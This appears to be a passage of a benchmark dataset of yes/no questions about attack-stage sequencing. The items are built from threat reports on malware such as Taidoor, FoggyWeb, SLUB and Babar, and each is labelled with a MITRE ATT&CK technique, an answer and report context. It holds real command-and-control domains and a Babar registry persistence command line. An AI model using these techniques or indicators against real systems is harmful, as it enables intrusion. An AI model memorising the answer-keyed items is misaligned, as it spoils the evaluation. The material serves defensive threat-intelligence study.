Initial Access: ProjectM actors gained initial access through spear-phishing emails and watering hole attacks, delivering payloads via malicious RTF and Excel files exploiting known vulnerabilities.
Execution: The ProjectM campaign executed malicious code through the use of Trojans like Crimson and Peppy, as well as RATs such as DarkComet and Bozok. Techniques included the exploitation of vulnerabilities and the use of malicious macros.
Defense Evasion: The ProjectM campaign utilized WHOIS protection services to conceal their infrastructure, but lapses in this practice revealed connections to an individual potentially involved in the campaign. The use of various Trojans and RATs also suggests techniques for defense evasion.
Command and Control: The ProjectM campaign's command and control infrastructure included domains registered with WHOIS protection, but two domains were linked to an individual's email address. These domains were used to host C2 servers for the Andromeda Trojan, which delivered further payloads.
Others: The individual linked to ProjectM's infrastructure appears to have skills in offensive cyber operations, as suggested by social media posts and blog content related to network scanning, Metasploit, and post-exploitation activities. The actor's name was found in the debug symbol path of Crimson tools, indicating possible involvement in malware development. The actor's anti-Indian sentiment, as expressed on social media, suggests a potential political motivation behind the attacks. Trend Micro discovered gigabytes of personal identifiable information (PII) on C2 servers related to ProjectM, indicating the collection of sensitive data from Indian Army personnel.",Yes,unit42-projectm-link-found-between-pakistani-actor-and-operation-transparent-tribe
1442,285,285-Defense Evasion-T1140-Deobfuscate/Decode Files or Information,"After exploiting a vulnerability in Microsoft Office (CVE-2012-0158) via email attachments to drop the Taidoor malware and opening a decoy document for initial access, is it likely that Taidoor will evolve to avoid common network detection signatures before communicating with its CnC servers (roudan.serveftp.com and mac.gov.hpc.tw) using a modified traffic pattern?","Defense Evasion: Taidoor has evolved to avoid common network detection signatures. The new variant uses a 'downloader' that retrieves encrypted text from Yahoo Blogs posts, which is then decrypted to a modified version of the Taidoor malware. This variant has also changed its network traffic pattern to avoid detection.","Reconnaissance: The Taidoor malware campaign begins with a spear-phishing email sent to targets, which may include government agencies, corporate entities, and think tanks, particularly those with interests in Taiwan. The email entices recipients to open an attached file, which, if executed on a vulnerable system, silently installs malware.
Initial Access: The Taidoor malware is delivered via email attachments. When the attachment is opened, it exploits a vulnerability in Microsoft Office (CVE-2012-0158) to drop the malware onto the target's system. A decoy document containing legitimate content is simultaneously opened to alleviate any suspicions.
Execution: The Taidoor malware, once installed, begins to beacon to a command-and-control (CnC) server using a consistent HTTP GET request pattern that includes an encrypted MAC address of the compromised computer.
Command and Control: The new Taidoor variant communicates with two CnC servers: roudan.serveftp.com and mac.gov.hpc.tw. The network traffic, or 'callback,' has been modified from the traditional version to use different file path names and formats.
Others: The Taidoor malware has been active since 2008 and continues to be used in cyber espionage campaigns. It has undergone significant tactical changes in 2011 and 2012. The malware is not off-the-shelf and suggests a connection between various activities using Taidoor. Another malware family, 'Taleret,' uses a similar technique to Taidoor for CnC server communication. There is a frequent association with Taiwan and a similar CnC naming scheme between Taidoor and Taleret.",Yes,evasive-tactics-taidoor-3
1444,285,285-Command and Control-T1071-Application Layer Protocol,"After the Taidoor malware avoids detection by using a downloader that decrypts a modified version of the malware, is it likely that the new Taidoor variant will communicate with the command-and-control servers roudan.serveftp.com and mac.gov.hpc.tw?","Command and Control: The new Taidoor variant communicates with two CnC servers: roudan.serveftp.com and mac.gov.hpc.tw. The network traffic, or 'callback,' has been modified from the traditional version to use different file path names and formats.","Reconnaissance: The Taidoor malware campaign begins with a spear-phishing email sent to targets, which may include government agencies, corporate entities, and think tanks, particularly those with interests in Taiwan. The email entices recipients to open an attached file, which, if executed on a vulnerable system, silently installs malware.
Initial Access: The Taidoor malware is delivered via email attachments. When the attachment is opened, it exploits a vulnerability in Microsoft Office (CVE-2012-0158) to drop the malware onto the target's system. A decoy document containing legitimate content is simultaneously opened to alleviate any suspicions.
Execution: The Taidoor malware, once installed, begins to beacon to a command-and-control (CnC) server using a consistent HTTP GET request pattern that includes an encrypted MAC address of the compromised computer.
Defense Evasion: Taidoor has evolved to avoid common network detection signatures. The new variant uses a 'downloader' that retrieves encrypted text from Yahoo Blogs posts, which is then decrypted to a modified version of the Taidoor malware. This variant has also changed its network traffic pattern to avoid detection.
Others: The Taidoor malware has been active since 2008 and continues to be used in cyber espionage campaigns. It has undergone significant tactical changes in 2011 and 2012. The malware is not off-the-shelf and suggests a connection between various activities using Taidoor. Another malware family, 'Taleret,' uses a similar technique to Taidoor for CnC server communication. There is a frequent association with Taiwan and a similar CnC naming scheme between Taidoor and Taleret.",Yes,evasive-tactics-taidoor-3
1449,286,286-Exfiltration-T1041-Exfiltration Over C2 Channel,"After passively monitoring HTTP GET and POST requests for actor-defined custom URI patterns as part of Command and Control, is FoggyWeb likely to exfiltrate the configuration database, decrypted token-signing certificates, and token-decryption certificates while also having the capability to download additional components from a C2 server?","Exfiltration: FoggyWeb exfiltrates the configuration database of compromised AD FS servers, decrypted token-signing certificates, and token-decryption certificates. It also allows for the download and execution of additional components from a C2 server.","Persistence: FoggyWeb is a persistent backdoor used by NOBELIUM, which is capable of exfiltrating sensitive information from compromised AD FS servers. It can also receive and execute additional malicious components from a C2 server. NOBELIUM drops two files on the system with administrative privileges: %WinDir%\ADFS\version.dll and %WinDir%\SystemResources\Windows.Data.TimeZones\pris\Windows.Data.TimeZones.zh-PH.pri. The version.dll acts as a loader for the encrypted FoggyWeb backdoor, which is stored in the Windows.Data.TimeZones.zh-PH.pri file. The loader uses a custom Lightweight Encryption Algorithm (LEA) to decrypt the backdoor in memory and loads it in the execution context of the AD FS application, granting it access to the AD FS codebase and resources.
Defense Evasion: FoggyWeb operates by leveraging the CLR hosting interfaces and APIs to load the backdoor within the same Application Domain as the legitimate AD FS managed code, allowing it to evade detection and gain programmatical access to AD FS classes, methods, properties, fields, objects, and components. This access enables FoggyWeb to interact directly with the AD FS codebase and perform its malicious operations without the need for external disk-resident tools.
Command and Control: FoggyWeb configures HTTP listeners for actor-defined URIs that mimic the structure of legitimate URIs used by the target's AD FS deployment. It passively monitors incoming HTTP GET and POST requests and intercepts those matching the actor's custom URI patterns. The backdoor can retrieve the token signing certificate, token decryption certificate, and AD FS configuration data of the compromised server, obfuscate the data, and return it to the issuer of the request. It can also execute .NET assemblies or source code in the context of the AD FS process.
Others: Microsoft has notified customers targeted or compromised by FoggyWeb and recommends auditing on-premises and cloud infrastructure, removing user and app access, reviewing configurations, re-issuing new credentials, and using a hardware security module (HSM) to secure AD FS servers. Microsoft security products have implemented detections and protections against FoggyWeb, and indicators of compromise (IOCs), mitigation guidance, detection details, and hunting queries are provided for Azure Sentinel and Microsoft 365 Defender customers.",Yes,FoggyWeb_ Targeted NOBELIUM malware leads to persistent backdoor _ Microsoft Security Blog
1453,287,287-Command and Control-T1132-Data Encoding,"After using cloud-based technology to create a malicious infrastructure for defense evasion, is GADOLINIUM likely to use Microsoft Graph API calls for command and control by allowing attackers to load additional modules on victim computers?","Command and Control: GADOLINIUM used Outlook Tasks as a mechanism for command and control (C2), utilizing a controlled OAuth access token to call the Outlook Task API. They also installed web shells on legitimate websites for C2 or traffic redirection. Microsoft Defender for Endpoint detects web shells by analyzing web server telemetry. In 2020, GADOLINIUM's PowerShell Empire toolkit allowed attackers to load additional modules to victim computers via Microsoft Graph API calls, using the attacker's Microsoft OneDrive account to execute commands and retrieve results between attacker and victim systems.","Initial Access: In 2019, GADOLINIUM delivered malicious Access database files to targets via spear-phishing emails. The initial file was an Access 2013 database (.accde format) that dropped a fake Word document, an Excel spreadsheet, and a VBA dropper called mm.accdb.core, which executed a .NET DLL payload. In 2020, GADOLINIUM sent spear-phishing emails with malicious PowerPoint attachments related to COVID-19, which dropped a file named doc1.dotm.
Privilege Escalation: GADOLINIUM used tools like LazyCat, which includes privilege escalation and credential dumping capabilities, to enable lateral movement across victim networks. Microsoft Defender for Endpoint detects the privilege escalation technique used by LazyCat.
Defense Evasion: GADOLINIUM has been using cloud services and open-source tools to obfuscate their activity and make it difficult for analysts to track. They have used cloud-based technology to create a malicious infrastructure that can be quickly established and taken down before detection or given up at little cost.
Others: Microsoft Security tracks advanced threat actors like GADOLINIUM and shares findings to harden products and platforms. Microsoft suspended 18 Azure Active Directory applications part of GADOLINIUM's malicious C2 infrastructure, protecting customers transparently. GADOLINIUM, a nation-state activity group, has been compromising targets for nearly a decade, focusing on the maritime and health industries, and has expanded targeting to the Asia Pacific region, higher education, and regional government organizations. Microsoft's proactive defense measures include detecting individual attack components and preventing attackers from using cloud infrastructure to execute attacks.",Yes,Microsoft Security—detecting empires in the cloud - Microsoft Security
1455,287,287-Privilege Escalation-T1548-Abuse Elevation Control Mechanism,"After delivering malicious Access database files through spear-phishing emails and executing .NET DLL payloads for initial access, is it likely that GADOLINIUM will use tools like LazyCat, which include privilege escalation capabilities, before engaging in defense evasion by using cloud services and open-source tools to obfuscate their activity?","Privilege Escalation: GADOLINIUM used tools like LazyCat, which includes privilege escalation and credential dumping capabilities, to enable lateral movement across victim networks. Microsoft Defender for Endpoint detects the privilege escalation technique used by LazyCat.","Initial Access: In 2019, GADOLINIUM delivered malicious Access database files to targets via spear-phishing emails. The initial file was an Access 2013 database (.accde format) that dropped a fake Word document, an Excel spreadsheet, and a VBA dropper called mm.accdb.core, which executed a .NET DLL payload. In 2020, GADOLINIUM sent spear-phishing emails with malicious PowerPoint attachments related to COVID-19, which dropped a file named doc1.dotm.
Defense Evasion: GADOLINIUM has been using cloud services and open-source tools to obfuscate their activity and make it difficult for analysts to track. They have used cloud-based technology to create a malicious infrastructure that can be quickly established and taken down before detection or given up at little cost.
Command and Control: GADOLINIUM used Outlook Tasks as a mechanism for command and control (C2), utilizing a controlled OAuth access token to call the Outlook Task API. They also installed web shells on legitimate websites for C2 or traffic redirection. Microsoft Defender for Endpoint detects web shells by analyzing web server telemetry. In 2020, GADOLINIUM's PowerShell Empire toolkit allowed attackers to load additional modules to victim computers via Microsoft Graph API calls, using the attacker's Microsoft OneDrive account to execute commands and retrieve results between attacker and victim systems.
Others: Microsoft Security tracks advanced threat actors like GADOLINIUM and shares findings to harden products and platforms. Microsoft suspended 18 Azure Active Directory applications part of GADOLINIUM's malicious C2 infrastructure, protecting customers transparently. GADOLINIUM, a nation-state activity group, has been compromising targets for nearly a decade, focusing on the maritime and health industries, and has expanded targeting to the Asia Pacific region, higher education, and regional government organizations. Microsoft's proactive defense measures include detecting individual attack components and preventing attackers from using cloud infrastructure to execute attacks.",Yes,Microsoft Security—detecting empires in the cloud - Microsoft Security
1456,287,287-Privilege Escalation-T1068-Exploitation for Privilege Escalation,"After delivering malicious Access database files via spear-phishing emails for initial access, is GADOLINIUM likely to use tools like LazyCat for privilege escalation and credential dumping before obfuscating their activities using cloud services and open-source tools for defense evasion?","Privilege Escalation: GADOLINIUM used tools like LazyCat, which includes privilege escalation and credential dumping capabilities, to enable lateral movement across victim networks. Microsoft Defender for Endpoint detects the privilege escalation technique used by LazyCat.","Initial Access: In 2019, GADOLINIUM delivered malicious Access database files to targets via spear-phishing emails. The initial file was an Access 2013 database (.accde format) that dropped a fake Word document, an Excel spreadsheet, and a VBA dropper called mm.accdb.core, which executed a .NET DLL payload. In 2020, GADOLINIUM sent spear-phishing emails with malicious PowerPoint attachments related to COVID-19, which dropped a file named doc1.dotm.
Defense Evasion: GADOLINIUM has been using cloud services and open-source tools to obfuscate their activity and make it difficult for analysts to track. They have used cloud-based technology to create a malicious infrastructure that can be quickly established and taken down before detection or given up at little cost.
Command and Control: GADOLINIUM used Outlook Tasks as a mechanism for command and control (C2), utilizing a controlled OAuth access token to call the Outlook Task API. They also installed web shells on legitimate websites for C2 or traffic redirection. Microsoft Defender for Endpoint detects web shells by analyzing web server telemetry. In 2020, GADOLINIUM's PowerShell Empire toolkit allowed attackers to load additional modules to victim computers via Microsoft Graph API calls, using the attacker's Microsoft OneDrive account to execute commands and retrieve results between attacker and victim systems.
Others: Microsoft Security tracks advanced threat actors like GADOLINIUM and shares findings to harden products and platforms. Microsoft suspended 18 Azure Active Directory applications part of GADOLINIUM's malicious C2 infrastructure, protecting customers transparently. GADOLINIUM, a nation-state activity group, has been compromising targets for nearly a decade, focusing on the maritime and health industries, and has expanded targeting to the Asia Pacific region, higher education, and regional government organizations. Microsoft's proactive defense measures include detecting individual attack components and preventing attackers from using cloud infrastructure to execute attacks.",Yes,Microsoft Security—detecting empires in the cloud - Microsoft Security
1462,288,288-Command and Control-T1573-Encrypted Channel,"After Tildeb utilizes command-line arguments to establish communication with its C&C server or listens on a TCP socket for incoming connections during execution, is it likely that the malware will establish network communication with its C&C server and set up a secure communication channel to encrypt subsequent traffic for command and control purposes?","Command and Control: Tildeb establishes network communication with its C&C server over TCP, using either ingress or egress connections. It employs the MFC Classes CAsyncSocket and CSocket for network communications and does not use SMTP despite the default port number assignment. The implant sets up a secure communication channel with the server, where all subsequent traffic is encrypted. It uses a modified SHA-1 hashing algorithm to generate pseudorandom data for establishing session keys, which are then used for XOR-encrypted communication.","Execution: The implant, identified as Tildeb, is a 32-bit console Windows executable named clocksvc.exe, which accepts command-line arguments and was compiled on October 3, 2000. It utilizes the MFC library, specifically mfc42.dll, for network communications and is compiled using Microsoft Visual C++ v6.0. Tildeb does not employ obfuscation techniques such as anti-disassembly, anti-debugging features, or encrypted strings. The implant can operate with various command-line arguments to establish communication with its C&C server using a hardcoded IP address and port, or alternative IP/domain and ports provided as arguments. It also has a capability to listen on a TCP socket for incoming connections and can attempt privilege elevation to inject code into a Microsoft Exchange Server process.
Defense Evasion: Tildeb lacks persistence mechanisms and is designed to clean up after itself if it does not receive data from the C&C server or encounters specific failures. It includes a cleanup thread that triggers a cleanup process under certain conditions, such as a lack of communication from the C&C server or failure to create a process. The cleanup process involves closing handles, deleting temporary files, shutting down sockets, and terminating the process.
Others: The implant Tildeb is associated with the moniker 'PATROLWAGON,' which is likely a reference to an unknown exploitation framework or tool. Tildeb's delivery method is not specified, but it may be distributed via lateral movement or other exploitation frameworks with RCE modules targeting Windows NT. The implant's hardcoded IP address contains a formatting error that affects its connectivity on different versions of Windows OS. Tildeb supports various control commands for malicious activities, including file deletion, file upload, directory listing, registry value modification, and code injection into Microsoft Exchange Server processes. It uses mailslots for interprocess communication and has specific routines for injecting code into Exchange Server processes. The implant attempts to exploit an unknown privilege escalation vulnerability in the win32k.sys driver on systems with specific locale settings.",Yes,tech-brief-tildeb-analyzing-the-18-year-old-implant-from-the-shadow-brokers-leak
1469,29,29-Defense Evasion-T1562-Impair Defenses,"After exploiting the VBScript engine vulnerability to gain initial access through a watering hole attack, is it likely that the attackers would proceed to impair defenses by making the first stage downloader exit if antivirus software processes are detected before downloading and executing a backdoor for further operations?","Defense Evasion: The first stage downloader exits if it detects any antivirus software processes, indicating an evasion tactic to avoid detection by security software.","Initial Access: The Trend Micro Cyber Safety Solutions Team, consisting of Cedric Pernet, Daniel Lunghi, Jaromir Horejsi, and Joseph C. Chen, reported on March 7, 2019, about a new malware spread via watering hole attacks. The attackers compromised a website and added code to redirect visitors to the infecting code, exploiting CVE-2018-8174, a VBScript engine vulnerability patched by Microsoft in May 2018.
Execution: The malware executes a multi-stage infection process. Initially, it exploits the VBScript engine vulnerability to download a DLL, which is then run in PowerShell. This downloader checks for antivirus software processes and exits if any are found. It also exploits CVE-2015-1701 for Local Privilege Escalation. The second stage involves downloading and executing a backdoor, named SLUB (for SLack and githUB; detected as Backdoor.Win32.SLUB.A).
Persistence: The SLUB backdoor achieves persistence by copying itself to ProgramData\update\ and creating a Run registry key with a typo in the ValueName, 'Microsoft Setup Initializazion', to call the export function UpdateMPUnits with rundll32.exe.
Privilege Escalation: The downloader exploits the CVE-2015-1701 vulnerability to acquire Local Privilege Escalation, likely by modifying code from a GitHub repository.
Discovery: The SLUB backdoor performs discovery by downloading a 'gist' snippet from GitHub and parsing it for commands to execute. It looks for lines starting with '^' and ending with '$', ignoring other lines. The backdoor also retrieves the username and computer name as part of its discovery process.
Collection: The backdoor supports various commands for data collection, including taking screenshots, listing files, copying files, and uploading files to the file.io website. It also collects information from registry keys and creates archives of user's Desktop folders for exfiltration.
Command and Control: The backdoor communicates with the attackers via Slack, using two hardcoded authentication tokens to post messages and command results to a private Slack channel. It also uses the Slack API to post messages.
Exfiltration: The attackers exfiltrate data by uploading files to the file.io website and posting download links to the Slack channel. They also create archive files of user's Desktop folders and build CAB files containing the file tree for exfiltration.
Others: The attackers' tools, techniques, and procedures indicate a stealthy targeted attack by capable actors. The GitHub account and Slack workspace were created specifically for the campaign, and the malware was compiled shortly after. The attackers tested the malware and began observing victims within days. They showed a strong interest in person-related information, focusing on communication software to learn more about the people behind the infected computers. The attackers used public third-party services to leave a clean footprint and targeted groups and individuals interested in political activities. Trend Micro informed the Canadian Centre for Cyber Security, which helped mitigate the attack. Slack and GitHub's security teams removed the related files, cutting off communication between the attackers and their malware.",Yes,New SLUB Backdoor Uses GitHub Communicates via Slack
1470,29,29-Collection-T1113-Screen Capture,"After the SLUB backdoor performs discovery by downloading and parsing commands from a GitHub 'gist' snippet to retrieve lines marked with specific patterns, is it likely to support various commands for data collection, such as taking screenshots, copying files, and creating archives of the user's Desktop folders for exfiltration?","Collection: The backdoor supports various commands for data collection, including taking screenshots, listing files, copying files, and uploading files to the file.io website. It also collects information from registry keys and creates archives of user's Desktop folders for exfiltration.","Initial Access: The Trend Micro Cyber Safety Solutions Team, consisting of Cedric Pernet, Daniel Lunghi, Jaromir Horejsi, and Joseph C. Chen, reported on March 7, 2019, about a new malware spread via watering hole attacks. The attackers compromised a website and added code to redirect visitors to the infecting code, exploiting CVE-2018-8174, a VBScript engine vulnerability patched by Microsoft in May 2018.
Execution: The malware executes a multi-stage infection process. Initially, it exploits the VBScript engine vulnerability to download a DLL, which is then run in PowerShell. This downloader checks for antivirus software processes and exits if any are found. It also exploits CVE-2015-1701 for Local Privilege Escalation. The second stage involves downloading and executing a backdoor, named SLUB (for SLack and githUB; detected as Backdoor.Win32.SLUB.A).
Persistence: The SLUB backdoor achieves persistence by copying itself to ProgramData\update\ and creating a Run registry key with a typo in the ValueName, 'Microsoft Setup Initializazion', to call the export function UpdateMPUnits with rundll32.exe.
Privilege Escalation: The downloader exploits the CVE-2015-1701 vulnerability to acquire Local Privilege Escalation, likely by modifying code from a GitHub repository.
Defense Evasion: The first stage downloader exits if it detects any antivirus software processes, indicating an evasion tactic to avoid detection by security software.
Discovery: The SLUB backdoor performs discovery by downloading a 'gist' snippet from GitHub and parsing it for commands to execute. It looks for lines starting with '^' and ending with '$', ignoring other lines. The backdoor also retrieves the username and computer name as part of its discovery process.
Command and Control: The backdoor communicates with the attackers via Slack, using two hardcoded authentication tokens to post messages and command results to a private Slack channel. It also uses the Slack API to post messages.
Exfiltration: The attackers exfiltrate data by uploading files to the file.io website and posting download links to the Slack channel. They also create archive files of user's Desktop folders and build CAB files containing the file tree for exfiltration.
Others: The attackers' tools, techniques, and procedures indicate a stealthy targeted attack by capable actors. The GitHub account and Slack workspace were created specifically for the campaign, and the malware was compiled shortly after. The attackers tested the malware and began observing victims within days. They showed a strong interest in person-related information, focusing on communication software to learn more about the people behind the infected computers. The attackers used public third-party services to leave a clean footprint and targeted groups and individuals interested in political activities. Trend Micro informed the Canadian Centre for Cyber Security, which helped mitigate the attack. Slack and GitHub's security teams removed the related files, cutting off communication between the attackers and their malware.",Yes,New SLUB Backdoor Uses GitHub Communicates via Slack
1473,29,29-Command and Control-T1071-Application Layer Protocol,"After exploiting CVE-2015-1701 for local privilege escalation and achieving persistence by creating a Run registry key with a typo in ""Microsoft Setup Initializazion,"" is it likely that the SLUB backdoor will use the Slack API to post messages and command results during command and control operations?","Command and Control: The backdoor communicates with the attackers via Slack, using two hardcoded authentication tokens to post messages and command results to a private Slack channel. It also uses the Slack API to post messages.","Initial Access: The Trend Micro Cyber Safety Solutions Team, consisting of Cedric Pernet, Daniel Lunghi, Jaromir Horejsi, and Joseph C. Chen, reported on March 7, 2019, about a new malware spread via watering hole attacks. The attackers compromised a website and added code to redirect visitors to the infecting code, exploiting CVE-2018-8174, a VBScript engine vulnerability patched by Microsoft in May 2018.
Execution: The malware executes a multi-stage infection process. Initially, it exploits the VBScript engine vulnerability to download a DLL, which is then run in PowerShell. This downloader checks for antivirus software processes and exits if any are found. It also exploits CVE-2015-1701 for Local Privilege Escalation. The second stage involves downloading and executing a backdoor, named SLUB (for SLack and githUB; detected as Backdoor.Win32.SLUB.A).
Persistence: The SLUB backdoor achieves persistence by copying itself to ProgramData\update\ and creating a Run registry key with a typo in the ValueName, 'Microsoft Setup Initializazion', to call the export function UpdateMPUnits with rundll32.exe.
Privilege Escalation: The downloader exploits the CVE-2015-1701 vulnerability to acquire Local Privilege Escalation, likely by modifying code from a GitHub repository.
Defense Evasion: The first stage downloader exits if it detects any antivirus software processes, indicating an evasion tactic to avoid detection by security software.
Discovery: The SLUB backdoor performs discovery by downloading a 'gist' snippet from GitHub and parsing it for commands to execute. It looks for lines starting with '^' and ending with '$', ignoring other lines. The backdoor also retrieves the username and computer name as part of its discovery process.
Collection: The backdoor supports various commands for data collection, including taking screenshots, listing files, copying files, and uploading files to the file.io website. It also collects information from registry keys and creates archives of user's Desktop folders for exfiltration.
Exfiltration: The attackers exfiltrate data by uploading files to the file.io website and posting download links to the Slack channel. They also create archive files of user's Desktop folders and build CAB files containing the file tree for exfiltration.
Others: The attackers' tools, techniques, and procedures indicate a stealthy targeted attack by capable actors. The GitHub account and Slack workspace were created specifically for the campaign, and the malware was compiled shortly after. The attackers tested the malware and began observing victims within days. They showed a strong interest in person-related information, focusing on communication software to learn more about the people behind the infected computers. The attackers used public third-party services to leave a clean footprint and targeted groups and individuals interested in political activities. Trend Micro informed the Canadian Centre for Cyber Security, which helped mitigate the attack. Slack and GitHub's security teams removed the related files, cutting off communication between the attackers and their malware.",Yes,New SLUB Backdoor Uses GitHub Communicates via Slack
1474,29,29-Command and Control-T1102-Web Service,"Is it likely that, after the SLUB backdoor collects information such as screenshots, file listings, and user Desktop folder archives, the malware will communicate with attackers using the Slack API to post messages and command results to a private Slack channel for command and control purposes?","Command and Control: The backdoor communicates with the attackers via Slack, using two hardcoded authentication tokens to post messages and command results to a private Slack channel. It also uses the Slack API to post messages.","Initial Access: The Trend Micro Cyber Safety Solutions Team, consisting of Cedric Pernet, Daniel Lunghi, Jaromir Horejsi, and Joseph C. Chen, reported on March 7, 2019, about a new malware spread via watering hole attacks. The attackers compromised a website and added code to redirect visitors to the infecting code, exploiting CVE-2018-8174, a VBScript engine vulnerability patched by Microsoft in May 2018.
Execution: The malware executes a multi-stage infection process. Initially, it exploits the VBScript engine vulnerability to download a DLL, which is then run in PowerShell. This downloader checks for antivirus software processes and exits if any are found. It also exploits CVE-2015-1701 for Local Privilege Escalation. The second stage involves downloading and executing a backdoor, named SLUB (for SLack and githUB; detected as Backdoor.Win32.SLUB.A).
Persistence: The SLUB backdoor achieves persistence by copying itself to ProgramData\update\ and creating a Run registry key with a typo in the ValueName, 'Microsoft Setup Initializazion', to call the export function UpdateMPUnits with rundll32.exe.
Privilege Escalation: The downloader exploits the CVE-2015-1701 vulnerability to acquire Local Privilege Escalation, likely by modifying code from a GitHub repository.
Defense Evasion: The first stage downloader exits if it detects any antivirus software processes, indicating an evasion tactic to avoid detection by security software.
Discovery: The SLUB backdoor performs discovery by downloading a 'gist' snippet from GitHub and parsing it for commands to execute. It looks for lines starting with '^' and ending with '$', ignoring other lines. The backdoor also retrieves the username and computer name as part of its discovery process.
Collection: The backdoor supports various commands for data collection, including taking screenshots, listing files, copying files, and uploading files to the file.io website. It also collects information from registry keys and creates archives of user's Desktop folders for exfiltration.
Exfiltration: The attackers exfiltrate data by uploading files to the file.io website and posting download links to the Slack channel. They also create archive files of user's Desktop folders and build CAB files containing the file tree for exfiltration.
Others: The attackers' tools, techniques, and procedures indicate a stealthy targeted attack by capable actors. The GitHub account and Slack workspace were created specifically for the campaign, and the malware was compiled shortly after. The attackers tested the malware and began observing victims within days. They showed a strong interest in person-related information, focusing on communication software to learn more about the people behind the infected computers. The attackers used public third-party services to leave a clean footprint and targeted groups and individuals interested in political activities. Trend Micro informed the Canadian Centre for Cyber Security, which helped mitigate the attack. Slack and GitHub's security teams removed the related files, cutting off communication between the attackers and their malware.",Yes,New SLUB Backdoor Uses GitHub Communicates via Slack
1476,29,29-Discovery-T1033-System Owner/User Discovery,"After achieving persistence by copying itself to ProgramData\update\ and creating a Run registry key with a typo in the ValueName, 'Microsoft Setup Initializazion', is the SLUB backdoor likely to retrieve the username and computer name as part of its discovery tactics before proceeding with data exfiltration by uploading files to the file.io website and sharing links via Slack?","Discovery: The SLUB backdoor performs discovery by downloading a 'gist' snippet from GitHub and parsing it for commands to execute. It looks for lines starting with '^' and ending with '$', ignoring other lines. The backdoor also retrieves the username and computer name as part of its discovery process.","Initial Access: The Trend Micro Cyber Safety Solutions Team, consisting of Cedric Pernet, Daniel Lunghi, Jaromir Horejsi, and Joseph C. Chen, reported on March 7, 2019, about a new malware spread via watering hole attacks. The attackers compromised a website and added code to redirect visitors to the infecting code, exploiting CVE-2018-8174, a VBScript engine vulnerability patched by Microsoft in May 2018.
Execution: The malware executes a multi-stage infection process. Initially, it exploits the VBScript engine vulnerability to download a DLL, which is then run in PowerShell. This downloader checks for antivirus software processes and exits if any are found. It also exploits CVE-2015-1701 for Local Privilege Escalation. The second stage involves downloading and executing a backdoor, named SLUB (for SLack and githUB; detected as Backdoor.Win32.SLUB.A).
Persistence: The SLUB backdoor achieves persistence by copying itself to ProgramData\update\ and creating a Run registry key with a typo in the ValueName, 'Microsoft Setup Initializazion', to call the export function UpdateMPUnits with rundll32.exe.
Privilege Escalation: The downloader exploits the CVE-2015-1701 vulnerability to acquire Local Privilege Escalation, likely by modifying code from a GitHub repository.
Defense Evasion: The first stage downloader exits if it detects any antivirus software processes, indicating an evasion tactic to avoid detection by security software.
Collection: The backdoor supports various commands for data collection, including taking screenshots, listing files, copying files, and uploading files to the file.io website. It also collects information from registry keys and creates archives of user's Desktop folders for exfiltration.
Command and Control: The backdoor communicates with the attackers via Slack, using two hardcoded authentication tokens to post messages and command results to a private Slack channel. It also uses the Slack API to post messages.
Exfiltration: The attackers exfiltrate data by uploading files to the file.io website and posting download links to the Slack channel. They also create archive files of user's Desktop folders and build CAB files containing the file tree for exfiltration.
Others: The attackers' tools, techniques, and procedures indicate a stealthy targeted attack by capable actors. The GitHub account and Slack workspace were created specifically for the campaign, and the malware was compiled shortly after. The attackers tested the malware and began observing victims within days. They showed a strong interest in person-related information, focusing on communication software to learn more about the people behind the infected computers. The attackers used public third-party services to leave a clean footprint and targeted groups and individuals interested in political activities. Trend Micro informed the Canadian Centre for Cyber Security, which helped mitigate the attack. Slack and GitHub's security teams removed the related files, cutting off communication between the attackers and their malware.",Yes,New SLUB Backdoor Uses GitHub Communicates via Slack
1478,290,290-Execution-T1059-Command and Scripting Interpreter,"After using a dropper to decrypt and load a DLL via regsvr32.exe, is Babar likely to establish persistence by creating a registry key under '[HKU]\..\CurrentVersion\Run' to execute its DLL at system boot time before employing Command and Scripting Interpreter to evade defenses?","Execution: The analyzed malware, named Babar, consists of a dropper and an implant designed to invade Windows desktop machines. The dropper operates by fetching an encrypted DLL from its own binary, decrypting it, and hiding it in the file system. It then loads the DLL using Windows regsvr32.exe. The implant, a 32-bit DLL written in C++, injects itself into running processes and applies global Windows hooks to invade desktop applications, enabling it to log keystrokes, capture screenshots, and spy on various applications.","Persistence: Babar ensures persistence by creating a registry key under '[HKU]\..\CurrentVersion\Run' named 'MSSecurity' which executes the command line '""regsvr32.exe"" /s /n /i ""%APPDATA%\%DLLNAME%""' at system boot time. This loads the Babar DLL and deploys the malware to various legitimate processes. The regsvr32.exe process remains running even after Babar is set up.
Defense Evasion: Babar's dropper reduces forensic artifacts by executing a command line through spawning a cmd.exe process, which is instructed to wait for 1 second before deleting the dropper binary on disk. The implant shows similar API name obfuscation methods as the Bunny malware and NBOT family, using an adapted version of SHA-1 to load dedicated APIs through a resolution function.
Collection: Babar's implant is capable of logging keystrokes, capturing screenshots, spying on installed softphones and instant messengers, and stealing data from office applications. It uses global Windows hooks to actively steal data from arbitrary processes and has a keylogger module that uses the raw input model to grab keyboard events.
Command and Control: Babar communicates with C&C servers through a separate export called 'FindCtxSectionStringW', which is invoked through remote thread injection. Two hardcoded C&C server addresses are included in its configuration data: 'http://www.horizons-tourisme.com/_vti_bin/_vti_msc/bb/index.php' and 'http://www.gezelimmi.com/wp-includes/misc/bb/index.php'.
Exfiltration: Babar compresses and encrypts data before dumping it to disk. It uses 128-bit AES encryption with a specific key for reading and writing files. The main instance of Babar handles stolen information received through named pipes from other instances or hooked processes.
Others: The report credits Morgan Marquis-Boire, Joan Calvet, Paul Rascagnéres, Alex Dulaunoy, Raphael Vinot, and the CIRCL Luxembourg team for their contributions. Marion Marschalek is the point of contact. The malware Babar will be presented at the SyScan'15 conference in March 2015. The report is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License.",Yes,Elephantosis
1481,290,290-Defense Evasion-T1070-Indicator Removal,"After ensuring persistence by creating a registry key to execute Babar's DLL using regsvr32.exe at system boot time, is it likely that Babar’s dropper will reduce forensic artifacts by using cmd.exe to delete the dropper binary on disk for defense evasion?","Defense Evasion: Babar's dropper reduces forensic artifacts by executing a command line through spawning a cmd.exe process, which is instructed to wait for 1 second before deleting the dropper binary on disk. The implant shows similar API name obfuscation methods as the Bunny malware and NBOT family, using an adapted version of SHA-1 to load dedicated APIs through a resolution function.","Execution: The analyzed malware, named Babar, consists of a dropper and an implant designed to invade Windows desktop machines. The dropper operates by fetching an encrypted DLL from its own binary, decrypting it, and hiding it in the file system. It then loads the DLL using Windows regsvr32.exe. The implant, a 32-bit DLL written in C++, injects itself into running processes and applies global Windows hooks to invade desktop applications, enabling it to log keystrokes, capture screenshots, and spy on various applications.
